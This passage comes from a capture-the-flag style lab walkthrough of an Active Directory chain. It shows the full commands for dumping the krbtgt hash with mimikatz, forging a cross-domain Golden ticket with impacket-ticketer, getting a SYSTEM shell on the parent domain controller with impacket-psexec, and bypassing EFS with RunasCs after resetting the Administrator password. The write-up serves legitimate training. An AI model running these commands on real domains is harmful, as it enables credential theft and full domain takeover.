This also means that we can create a Golden ticket through Kerberos that can be used across both domains. For context, a Golden ticket is a forged TGT, which is signed by the respective domain's `krbtgt` service account. This ticket can be used to impersonate any user, on any service, to every machine on the domain (or within the domain trust!). What also makes this incredibly powerful is that the credentials are never changed automatically. This means that if you have the `krbtgt` AES or NTLM hash, you can essentially perform almost any domain attack that you'd like (such as `dcsync` as an example).

In order to exploit the domain trust, we'll need three different things: 
* The `NTLM` of the `krbtgt` domain object.
* The `LAB` domain object SID.
* The `TRUSTED` domain object SID for the `Enterprise Admins` group.

In order to get all three of those, we can use `mimikatz` to dump all of this information. Generally we'd want to try and get `mimikatz` past AV by utilizing a C2 or by process injection, however we won't need to do this since Defender is not enabled for this chain.

# Golden Ticket to DC2

Thus, we can just drop `mimikatz` to disk and run it through the DC. https://github.com/ParrotSec/mimikatz

```
sliver > upload mimikatz.exe

C:\Users\cpowers\Documents> .\mimikatz.exe "privilege::debug" "lsadump::lsa /user:krbtgt /patch" "exit"
```

This gives us the `krbtgt` NTLM hash as well as the `LAB` domain SID.
In order to get the domain SID of the `TRUSTED` domain, we can use a built-in PowerShell cmdlet call `Get-ADGroup`.

```
PS C:\Users\cpowers\Documents> Get-ADGroup -Filter {name -eq "Enterprise Admins"} -Server trusted.vl
```

Try not to do this through `Evil-WinRM`, I ran into some domain resolution issues and instead found better luck by running it through a reverse shell.
We now have the following information in order to build our Golden ticket.

```
NTLM Hash     - [...snip...]
LAB SID       - S-1-5-21-2241985869-2159962460-1278545866
TRUSTED SID   - S-1-5-21-3576695518-347000760-3731839591-519
Target Domain - trusted.vl

> impacket-ticketer -nthash [...snip...] -domain-sid S-1-5-21-2241985869-2159962460-1278545866 -extra-sid S-1-5-21-3576695518-347000760-3731839591-519 -domain lab.trusted.vl Administrator
```

This saves our Golden ticket as a new file called `Administrator.ccache`. We'll need to set this as a global variable on our Kali machine to use this to authenticate with Kerberos on the parent domain.

Once all of this is completed, we can use `psexec` to spawn a shell in this domain as the `Administrator` user. Reminder to use the `FQDN` (Fully Qualified Domain Name) of the parent domain controller, which is `trusteddc.trusted.vl`.

```
> export KRB5CCNAME=Administrator.ccache

> impacket-psexec lab.trusted.vl/Administrator@trusteddc.trusted.vl -k -no-pass -target-ip 10.10.197.213
```

This will open up a remote shell through `PsExec` on the `TRUSTEDDC` domain controller a `SYSTEM`, meaning we have completed this chain! Is what I hoped.

![](/images/vulnlab/trusted-vl/q.jpg)

You'll notice that if you try to read the `root.txt`, we don't have the permissions to read it. Which if we think about it, doesn't make sense right? We're `SYSTEM` yet we don't have permissions to read the file.

My guess is that there are privileges that restricting us from accessing this file, meaning we need to use . To save some time (in the screenshot above as you'll notice), I used `mimikatz` to dump the Administrator hash and log-in with it through WinRM, however this STILL did not let us access the file.

`C:\Users\Administrator\Desktop> .\mimikatz.exe "privilege::debug" "lsadump::lsa /user:Administrator /patch" "exit"
`evil-winrm --ip 10.10.197.213 -u 'Administrator' -H '[...snip...]'` (with Administrator NTLM hash)

If you run `cipher /u /n` on the machine, you'll notice that the `root` flag is encrypted with `EFS`.

![](/images/vulnlab/trusted-vl/r.jpg)

# EFS Bypass as SYSTEM

EFS (Encrypted File System) is a built-in Windows encryption feature that allows you to encrypt files or directories to prevent other users from opening them. This produces a certificate, which is required to be present in your current session in order to decrypt the encrypted file and read it.

I also plan on creating a blog post based on `EFS` file decryption, as there's other bypasses aside from the one you'll see in a few moments.

To bypass this, we can use `runasCs` to circumvent the `EFS` encryption and read the flag as we  would normally.
We'll also need to change the `Administrator`'s user password in order to use `runasCs`, which is really simple now that we have access to command-line session as this user.

`net user administrator "password123@"`
https://github.com/antonioCoco/RunasCs

Note that you can just use the PowerShell module that comes in this GitHub package, and just import it. Make sure to also upload this in a directory other than the `Administrator` directory, as this entire directory under the `EFS` encryption rule.

```
sliver > upload RunasCs/Invoke-RunasCs.ps1

*Evil-WinRM* PS C:\Users\Public\Desktop> Import-Module .\Invoke-RunasCs.ps1; Invoke-RunasCs administrator "password123@" "cmd.exe /c type C:\users\administrator\desktop\root.txt"
```

This will open the file and allow us to read the contents of the `root` flag. Thus, we have completed this chain!

# Conclusion

Big thanks to `r0BIT` for creating this chain, as it was extremely helpful in understanding Domain Dominance and EFS encryption. Helped a lot to help myself understand these topics and how to perform them mainly through Kali (and with some help through Mimikatz).

# Resources

https://github.com/dirkjanm/BloodHound.py
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux
https://www.exploit-db.com/exploits/10484
https://github.com/Sysinternals/ProcMon-for-Linux?tab=readme-ov-file
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking
https://github.com/BishopFox/sliver
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
https://github.com/ParrotSec/mimikatz
https://github.com/antonioCoco/RunasCs
